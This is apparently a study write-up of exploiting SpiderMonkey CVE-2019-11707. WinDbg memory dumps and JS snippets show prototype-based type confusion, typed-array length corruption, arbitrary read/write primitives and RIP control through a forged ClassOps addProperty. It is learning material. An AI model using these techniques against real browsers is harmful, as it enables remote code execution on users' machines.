# Resources
Credits to:

1) https://doar-e.github.io/blog/2018/11/19/introduction-to-spidermonkey-exploitation/
2) https://blog.bi0s.in/2019/08/18/Pwn/Browser-Exploitation/cve-2019-11707-writeup/

Firebox v8 shell can be found here:
https://github.com/0vercl0k/blazefox/releases/download/1/js-release.7z

# Debugging Command
"C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\windbg.exe" /g/G/o js.exe -f exploit.js -i --no-threads

## Debugging breakpoints
bp js!js::math_atan2

# Question 1: How does v4 (the object in POC provided) look like in memory?

v4 is an array with 5 elements. Each element has one property.
```

const v4 = [{a: 0}, {a: 1}, {a: 2}, {a: 3}, {a: 4}];

objectAddress(v4); #0000020720F90100

00000207`20f90100 0000020720f7acd0 
00000207`20f90108 0000020720f997e8 
00000207`20f90110 0000000000000000 
00000207`20f90118 0000020720f90130 ---> Element pointer (This is typically directly after the object address)
00000207`20f90120 0000000500000000 
00000207`20f90128 0000000500000006
00000207`20f90130 fffe020720f7e1c0 ---> We can see a few addresses here
00000207`20f90138 fffe020720f7e1f0 
00000207`20f90140 fffe020720f7e220 
00000207`20f90148 fffe020720f7e250 
00000207`20f90150 fffe020720f7e280

The first element is fffe020720f7e1c0.
 
Firefox works in such a way where the first 4 bytes (FFFE) denotes the type of the objects, and the last 8 bytes is the actual address of object.

00000207`20f7e1c0 0000020720f7aca0 
00000207`20f7e1c8 0000020720fae858 
00000207`20f7e1d0 0000000000000000 
00000207`20f7e1d8 00007ff6a71ddac0 js!emptyElementsHeader+0x10
00000207`20f7e1e0 fff8800000000000	---> Object property a: 0

Second element:
00000207`20f7e1f0 0000020720f7aca0 
00000207`20f7e1f8 0000020720fae858 
00000207`20f7e200 0000000000000000 
00000207`20f7e208 00007ff6a71ddac0 js!emptyElementsHeader+0x10
00000207`20f7e210 fff8800000000001 ---> Object property a: 1

...

```

# POC Code flow: 
1) Pop away all the values in v4
2) Once length hits 0, set the third element.
3) Further Pop calls will pop from the element p, the prototype of v4 (v4.__proto__ = p)

```
Evaluate expression: -2111062325329916 = fff88000`00000004
Evaluate expression: -2111062325329917 = fff88000`00000003
Evaluate expression: -2111062325329918 = fff88000`00000002
Evaluate expression: -2111062325329919 = fff88000`00000001
Evaluate expression: -2111062325329920 = fff88000`00000000
Evaluate expression: -2111062325329915 = fff88000`00000005
Evaluate expression: -2111062325329918 = fff88000`00000002
Evaluate expression: -2111062325329919 = fff88000`00000001
```
 
# Question 2: Why do we need v8 and v9 here?
Without v8 and v9, the crash is still in the same area...

0:000> g
(216c.2e0c): Access violation - code c0000005 (!!! second chance !!!)
0000037a`8de694cf 4c3919          cmp     qword ptr [rcx],r11 ds:41414141`41414141=????????????????

v8 and v9 is not required.

# Question 3: What is the memory layout in a object with proto?

```
var p = {};
p.__proto__ = [{a: 0}, {a: 1}, {a: 2}];

js> p
[{a:0}, {a:1}, {a:2}]
js> dumpObject(p)
object 28502490120
  global 2850248d060 [global]
  class 7ff6c52d4218 Object
  group 2850248a8e0
  flags: inDictionaryMode hasShapeTable
  proto <Array object at 285024980a0>
  properties:
  
ObjectAddress:
00000285`02490120 000002850248a8e0 	---> Taking this pointer (Group)
00000285`02490128 00000285024b18f8 (Shape)
00000285`02490130 0000000000000000 
00000285`02490138 00007ff6c530d2e8 js!emptyElementsHeader+0x10

ObjectAddress -> Group
00000285`0248a8e0 00007ff6c52d4218 js!js::PlainObject::class_
00000285`0248a8e8 00000285024980a0	---> Taking this pointer (Shape)
00000285`0248a8f0 000002850213b000 

ObjectAddress -> Group -> Shape
00000285`024980a0 000002850248a8b0 
00000285`024980a8 00000285024b3078 
00000285`024980b0 0000000000000000 
00000285`024980b8 00000285024980d0 ---> Element

ObjectAddress -> Group -> Shape -> Element
00000285`024980d0 fffe02850248e160 ---> Element 1
00000285`024980d8 fffe02850248e190 
00000285`024980e0 fffe02850248e1c0 

ObjectAddress -> Group -> Shape -> Element -> Value
00000285`0248e160 000002850248a880 
00000285`0248e168 00000285024b18a8 
00000285`0248e170 0000000000000000 
00000285`0248e178 00007ff6c530d2e8 js!emptyElementsHeader+0x10
00000285`0248e180 fff8800000000000	---> Value we looking for!

  
```

## Nested prototypes
```

var p = {};
p.__proto__ = [{a: 0}, {a: 1}, {a: 2}];

//BEBF414141414141
p[0] = -1.8629373288622089e-06;

//p[0] = 2261634.5098039214;
v4.__proto__ = p;

```

v4 is a prototype of p. 

p is a prototype of [{a: 0}, {a: 1}, {a: 2}].


# Question 4: Looks like we have a type confusion between object and double pointer, how then to proceed??

Following along this tutorial (https://blog.bi0s.in/2019/08/18/Pwn/Browser-Exploitation/cve-2019-11707-writeup/),
I also tried to do a Type Confusion between an Uint8 and Uint32 Array.

Since Uint8Array has been confused to be a Uint32Array, we can actually index out of bounds of the usual limit of an UInt8Array.

By some trial and error and looking at the memory, the UInt32Array is located just 0x60 away from Uint8Array.

So if we just set u8junk[18] to a large value, we can overwrite the length of u32junk.

## Structure layout of Uint8Array and Uint32Array:
```
js> objectAddress(u8junk)
"000001EE7E701B00"

js> objectAddress(u32junk)
"000001EE7E701B60"

u8junk:
000001ee`7e701b00 000001ee7ef7adf0 
000001ee`7e701b08 000001ee7efb1920 
000001ee`7e701b10 0000000000000000 
000001ee`7e701b18 00007ff6a71ddac0 js!emptyElementsHeader+0x10
000001ee`7e701b20 fffa000000000000 
000001ee`7e701b28 fff8800000000020 ---> Length 
000001ee`7e701b30 fff8800000000000 
000001ee`7e701b38 000001ee7e701b40 
000001ee`7e701b40 0000000003030101 ---> Element pointer 

u32junk:
000001ee`7e701b60 000001ee7ef7af40 
000001ee`7e701b68 000001ee7efb1c18 
000001ee`7e701b70 0000000000000000 
000001ee`7e701b78 00007ff6a71ddac0 js!emptyElementsHeader+0x10
000001ee`7e701b80 fffe01ee7ef94080 
000001ee`7e701b88 fff88000000000ff ---> corrupted length!
000001ee`7e701b90 fff8800000000000 
000001ee`7e701b98 000001ee7f302080 ---> Element pointer


```

# Develop our arbitrary read/write primitive

Both Arbitrary Read Primitive and Arbitrary Write Primitive are achieved by corrupting element points of helper arrays.

# RIP Control

We will be achieving RIP Control by overwriting a JSFunction in the object. 

The class structure is a pointer that can be overwritten. We will copy a normal class structure then overwrite the cops pointer and finally overwrite AddProperty.

RIP Control can then be achieved by adding a property in the corrupted object. 

```
0:012> dt -b js::NativeObject 01a64a094100
   +0x000 group_           : js::GCPtr<js::ObjectGroup *>
      +0x000 value            : 0x000001a6`4a07ac70 	---> Deref this
   +0x008 shapeOrExpando_  : 0x000001a6`4a0997e8 
   +0x010 slots_           : (null) 
   +0x018 elements_        : 0x000001a6`4a094130 


000001a6`4a07ac70 00007ff6a71aed88 js!class_
000001a6`4a07ac78 000001a64a0a8040 
000001a6`4a07ac80 000001a649e2a800 

0:012> dt js!class_ 00007ff6a71aed88 
   +0x000 name             : 0x00007ff6`a729e154  "Array"
   +0x008 flags            : 0xc000002
   +0x010 cOps             : 0x00007ff6`a71aecf0 js::ClassOps
   +0x018 spec             : 0x00007ff6`a71aed48 js::ClassSpec

00007ff6`a71aed88 00007ff6a729e154 js!`string'
00007ff6`a71aed90 000000000c000002 
00007ff6`a71aed98 00007ff6a71aecf0 js!ArrayObjectClassOps
00007ff6`a71aeda0 00007ff6a71aed48 js!ArrayObjectClassSpec

0:012> dt js::ClassOps 07ff6`a71aecf0
   +0x000 addProperty      : 0x00007ff6`a68f73c0     bool  js!array_addProperty+0
   +0x008 delProperty      : (null) 
   +0x010 enumerate        : (null) 
   +0x018 newEnumerate     : (null) 


```